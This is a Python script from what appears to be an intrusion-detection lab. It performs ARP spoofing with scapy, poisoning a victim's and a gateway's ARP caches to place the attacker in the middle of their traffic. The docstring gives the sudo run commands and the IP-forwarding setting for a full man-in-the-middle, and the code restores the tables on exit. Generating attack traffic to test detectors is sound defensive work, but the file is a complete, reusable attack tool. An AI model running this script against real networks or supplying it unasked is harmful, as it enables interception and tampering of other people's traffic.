"""ARP spoofing (man in the middle) between a victim and the gateway (owner: Bhavya).

Sends forged ARP replies so the victim and gateway both associate the attacker's
MAC with the other's IP. The MI (MAC+IP) features catch it: the attacker's MAC
suddenly claims the gateway's IP. Restores the correct tables on exit.

    sudo python3 lab/attacks/arpspoof.py --victim 10.10.0.20 --gateway 10.10.0.1 --duration 60
    sudo python3 lab/attacks/arpspoof.py --victim 10.10.0.20 --gateway 10.10.0.1 --mode gratuitous

Enable forwarding for a true MitM: sysctl -w net.ipv4.ip_forward=1
"""

from __future__ import annotations

import argparse
import time

from attack_base import AttackRun


def mac_of(ip):
    from scapy.all import ARP, Ether, srp  # noqa: N811
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0, retry=2)
    for _, r in ans:
        return r.hwsrc
    raise SystemExit(f"could not find the MAC for {ip} (is it up and on the lab network?)")


def poison(target_ip, target_mac, spoof_ip, run):
    from scapy.all import ARP, send  # noqa: N811
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip), verbose=0)
    run.sent += 1


def restore(a_ip, a_mac, b_ip, b_mac):
    from scapy.all import ARP, send  # noqa: N811
    for _ in range(5):
        send(ARP(op=2, pdst=a_ip, hwdst=a_mac, psrc=b_ip, hwsrc=b_mac), verbose=0)
        send(ARP(op=2, pdst=b_ip, hwdst=b_mac, psrc=a_ip, hwsrc=a_mac), verbose=0)


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--victim", required=True)
    ap.add_argument("--gateway", required=True)
    ap.add_argument("--mode", choices=["mitm", "gratuitous"], default="mitm")
    ap.add_argument("--duration", type=float, default=60)
    ap.add_argument("--interval", type=float, default=2.0, help="seconds between forged replies")
    args = ap.parse_args(argv)

    from scapy.all import conf, get_if_hwaddr  # noqa: N811
    my_mac = get_if_hwaddr(conf.iface)
    victim_mac, gw_mac = mac_of(args.victim), mac_of(args.gateway)

    with AttackRun("arpspoof", args.mode, target=f"{args.victim},{args.gateway}",
                   rate=f"every {args.interval}s", attacker_mac=my_mac,
                   note="forwarding assumed on for mitm") as run:
        end = time.time() + args.duration
        try:
            while time.time() < end:
                if args.mode == "gratuitous":
                    poison("10.10.0.255", "ff:ff:ff:ff:ff:ff", args.gateway, run)
                else:
                    poison(args.victim, victim_mac, args.gateway, run)
                    poison(args.gateway, gw_mac, args.victim, run)
                time.sleep(args.interval)
        finally:
            restore(args.victim, victim_mac, args.gateway, gw_mac)
            print("restored ARP tables")


if __name__ == "__main__":
    main()
